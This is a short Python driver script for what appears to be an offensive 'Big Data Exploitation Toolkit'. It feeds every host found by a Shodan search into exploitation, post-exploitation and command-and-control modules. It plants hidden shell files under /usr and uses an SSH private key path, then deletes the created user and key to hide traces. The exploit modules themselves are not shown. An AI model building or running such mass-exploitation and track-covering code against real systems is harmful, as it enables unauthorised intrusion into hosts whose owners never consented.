import shodan_thread
import exploitation
import postexploitation
import c2
import delete
import time

W  = '\033[0m'  # white (normal)
R  = '\033[31m' # red

'''
Function to parse shodan_thread function output
'''
def parseShodan():
    l = shodan_thread.start()
    if len(l) == 1:
        return l[0]
    else:
        for v in l:
            print(v)

'''
Big Data Exploitation Toolkit main function
'''
def bdsploit(url):
    host = exploitation.exploit(url)
    print("***** To connect to the host use the following IP: {}{}{}".format(R, host, W))
    postexploitation.postexploit(host)
    c2.c2(host, "tools/done.shell", "/home/test/.ssh/id_rsa", "/usr/.bdsptc2.shell", "/usr/.bdsptc2.sh")
    print("Sleeping 5 seconds to delete user and SSH key")
    time.sleep(5)
    delete.delete(host, "/home/test/.ssh/id_rsa")


if __name__ == '__main__':
    l = shodan_thread.start()
    for v in l:
        bdsploit(v)
